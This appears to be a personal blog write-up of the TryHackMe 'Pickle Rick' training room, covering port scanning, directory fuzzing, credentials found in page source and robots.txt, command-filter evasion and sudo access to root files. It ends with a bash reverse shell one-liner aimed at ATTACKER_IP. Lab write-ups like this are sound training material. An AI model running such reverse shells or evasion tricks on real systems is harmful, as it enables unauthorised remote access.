---
layout: post
title: Pickle Rick CTF
date: 2025-06-20 23:47 +0300
categories: [CTF,THM]
tags: [CTF,THM, write-up]
---

# Pickle Rick CTF
link: [https://tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick)

This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.


Let's start:\
the ip of my Target Machine is: `10.10.54.36` (yours will be different).

so let's start with a [NMAP] scan:
`nmap -sS -sV -O -v 10.10.54.36`

Explanation:
- -sS - SYN scan is the default and most popular scan option, It can be performed quickly, It is also relatively unobtrusive and stealthy since it never completes TCP connections
- -sV - Enables version detection
- -O - Enables OS detection
- -v - Increases the verbosity level, causing Nmap to print more information about the scan in progress.

Result:
![scan](https://i.imgur.com/QXAEZGa.png)

As we can see from the scan

Open Ports:
```terminal
22/tcp ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

OS:
`OS details: Linux 4.15`

So with 80 port open let's open a browser and go to `10.10.54.36:80` 
![first look](https://i.imgur.com/w29lBzP.jpeg)

First let's check if there is something hidden in the html by opening dev-tools:

![https://i.imgur.com/BSmwRua.png](https://i.imgur.com/BSmwRua.png)
There is a comment in the html giving us a username:
`Username: R1ckRul3s`

Now that we have a user we need to find a password (maybe crack it or brut-force it?) and something to login to.

Let's check if there is more routes for `http://10.10.54.36:80/`, im useing [ffuf]:
`ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.54.36:80/FUZZ`

Explanation:
- -w - a word list
- -u - Target URL

ffuf will go through the words in the word list and use them where the `FUZZ` is, and print successful requests.

Result:
![ffuf](https://i.imgur.com/vBhDtFA.png)
(some alternative tools: gobuster, dirb)


As we can see we have new leads:
```terminal
/assets (200 OK)                  
/.hta (403 Forbidden)                  
/.htaccess (403 Forbidden)              
/.htpasswd (403 Forbidden)               
/index.html (200 OK)              
/robots.txt (200 OK)             
/server-status (403 Forbidden)
```
\
Let's check out `/robots.txt`:
![robots.txt](https://i.imgur.com/eRM88zo.png)
So in the [robots.txt] we got `Wubbalubbadubdub` but we still not sure what to use it for and where....
maybe it's a password?

After trying to use this to connect to the [SSH] with: `ssh R1ckRul3s@10.10.54.36` I can see that the SSH is configured to use keys instead of passwords.

We also see that `/assets` is open let's go there:
![assets](https://i.imgur.com/t4h9apQ.png)

We can see a list of files
checking those file data using [hex editor] did not yeeld any new leads
also there was no [Steganography] in those pictures.

If those pictures are here, there must be a use for them (like `rickandmorty.jpeg` we see at the index) and one of them is a hint for a hidden route ffuf didnt found: `/portal.php` that redirect us to `login.php` 

![portal](https://i.imgur.com/sKf37e7.png)

Let's try the username and the string we found in the robots.txt
```
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

And we are in :D !!!
![command panel](https://i.imgur.com/IhkUzDf.png)

We get a command panel that let us run command in the machine
also can see multiple tabs in the Rick Portal, but when we try to go to them we get denied...

Let's try to see what around us with `ls`:
```terminal
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```
We can see all the files in this folder and there it is the first flag `Sup3rS3cretPickl3Ingred.txt`!

Let's print it with `cat Sup3rS3cretPickl3Ingred.txt`

But not so fast seems like that command is disabled!
![fail](https://i.imgur.com/CuyBThz.png)

Let's try to print it using other methods:

```
head Sup3rS3cretPickl3Ingred.txt - disabled
tail Sup3rS3cretPickl3Ingred.txt - disabled
more Sup3rS3cretPickl3Ingred.txt - disabled
less Sup3rS3cretPickl3Ingred.txt - success!!
------------
some more fun ways:
awk '{ print }' Sup3rS3cretPickl3Ingred.txt
sed '' Sup3rS3cretPickl3Ingred.txt
grep -m1 "" Sup3rS3cretPickl3Ingred.txt
cut -c1- Sup3rS3cretPickl3Ingred.txt
nl Sup3rS3cretPickl3Ingred.txt
```

**~And we got the first flag (What is the first ingredient that Rick needs?)~**

Also we see a file name `clue.txt` let see what clue we got:
```terminal
$> sed '' clue.txt

Look around the file system for the other ingredient.
```
So we now the rest of the ingredient (flags) are around the system

After looking around using `ls /...` we found the second ingredient in `/home/rick/` 
```terminal
$> ls /home/rick/
second ingredients
```

And using `less '/home/rick/second ingredients'` 

**~we got the second flag (What is the second ingredient in Rick’s potion?)~**

After looking around more the only place left to look at is `/root/` but we dont have the permissions to go in....

Let's give `sudo` a try: 
```terminal
$> sudo ls /root/
3rd.txt
snap
```
And it worked we have here the third flag!!

`sudo less /root/3rd.txt`

**~we got the third flag (What is the last and final ingredient?)~**

And that's it we helped Rick make his potion and transform himself back into a human from a pickle.


## Alternative way to solve the CTF

After getting into Rick Portal we can generate a [reverse shell] to make our life easer using our own shell:


In our machne let's create a listener using:
`nc -lvnp PORT`

And now let's send the [reverse shell] to the server

`bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'`

And we get a [reverse shell] to the machine that mean we don't have and limitations from the Rick Portal
```
/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt
~first flag~

/var/www/html$ cat '/home/rick/second ingredients'
~second flag~

/var/www/html$ sudo cat /root/3rd.txt
~third flag~
```

\
Hope this was helpful and fun for you to read :)\
Shai Shaked.